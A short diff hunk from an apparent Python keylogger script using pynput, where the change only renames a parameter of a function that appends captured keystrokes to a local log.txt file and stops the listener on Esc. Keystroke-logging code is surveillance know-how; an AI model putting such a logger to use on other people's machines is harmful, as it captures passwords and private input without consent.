@@ -15,7 +15,7 @@ def on_release(key):
     if key==pynput.keyboard.Key.esc:
         write_log(log)
         return False
-def write_log(kig):
+def write_log(key):
     with open("log.txt","a") as f:
         f.write(log)
 with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as Listener:
